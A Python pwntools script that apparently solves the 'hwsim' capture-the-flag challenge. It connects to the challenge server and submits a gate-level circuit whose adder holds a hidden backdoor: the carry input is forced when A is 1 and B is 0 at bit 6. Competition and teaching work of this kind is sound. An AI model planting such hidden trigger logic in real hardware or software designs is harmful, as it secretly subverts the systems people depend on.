from pwn import *

# How the exploit works:
# Essentially we keep a counter that counts the number of add() calls,
# when counter > some number, A == 1 and B == 0, we know that adder is important (in program instruction 22).
# So we flips that adder.

# io = process(["python3", "./hwsim.py"])
io = remote("hwsim.2024.ctfcompetition.com", 1337)

io.recvline_endswith(b"5. Quit")


def add_gate(out, inp1, inp2):
    io.sendline(b"3")  # Add new gate

    io.sendline(f"{out} {inp1} {inp2}".encode())


gates = [
    # Helpers
    ("zero", "one^", "one^"),
    ("one^", "zero", "zero"),
    ("flip_A", "A", "A"),
    ("flip_B", "B", "B"),
    ("flip_C", "C", "C"),

    # Full adder
    ("n1", "A", "B"),
    ("n2", "A", "n1"),
    ("n3", "n1", "B"),
    ("n4", "n2", "n3"),
    ("n5", "n4", "fake_C"),
    ("n6", "n4", "n5"),
    ("n7", "n5", "fake_C"),
    ("S", "n6", "n7"),
    ("Cout", "n5", "n1"),

    # Toggle set register
    ("a1^", "A", "A"),
    ("a2", "a1^", "a1^"),
    ("a3^", "a2", "a2"),
    ("a4^", "A", "a3^"),
    ("setting", "a4^", "a4^"),

    # Bit 6 magic (A == 1 and B == 0 and is bit 6)
    ("g1", "A", "flip_B"),
    ("g2", "g1", "g1"),
    ("backdoor_off", "6_acc_out_on", "g2"),
    ("backdoor_on", "backdoor_off", "backdoor_off"),

    # In backdoor, we set input C to 1
    ("fake_C", "backdoor_off", "flip_C"),
]

for (a, b, c) in gates:
    add_gate(a, b, c)

for i in range(7):
    gates = [
        # Register
        (f"{i}_acc_out_off^", f"{i}_acc_out_on", f"{i}_acc_inp_on^"),
        (f"{i}_acc_out_on", f"{i}_acc_out_off^", f"{i}_acc_inp_off^"),

        # Set register
        (f"{i}_acc_inp_off^", f"{i}_add_out_on", f"setting"),
        (f"{i}_acc_inp_on^", f"{i}_add_out_off^", f"setting")
    ]
    for (a, b, c) in gates:
        add_gate(a, b, c)

half_adder = [
    ("t1^", "acc_out_on", "add_carry"),
    ("t2^", "acc_out_on", "t1^"),
    ("t3^", "add_carry", "t1^"),
    ("add_out_on", "t2^", "t3^"),
    ("add_out_off^", "add_out_on", "add_out_on"),
    ("Cout", "t1^", "t1^"),
]

add_gate("0_add_carry", "zero", "zero")

for i in range(7):
    for o, i1, i2 in half_adder:
        if o == "Cout":
            # Join carry output and input.
            add_gate("%d_%s" % (i+1, "add_carry"), "%d_%s" %
                     (i, i1), "%d_%s" % (i, i2))
        else:
            add_gate("%d_%s" % (i, o), "%d_%s" %
                     (i, i1), "%d_%s" % (i, i2))

io.sendline(b"4")  # Send to factory and test

# Adjust the iteration count
for _ in range(52):
    io.sendline(b"A")

io.sendline(b"")

io.interactive()
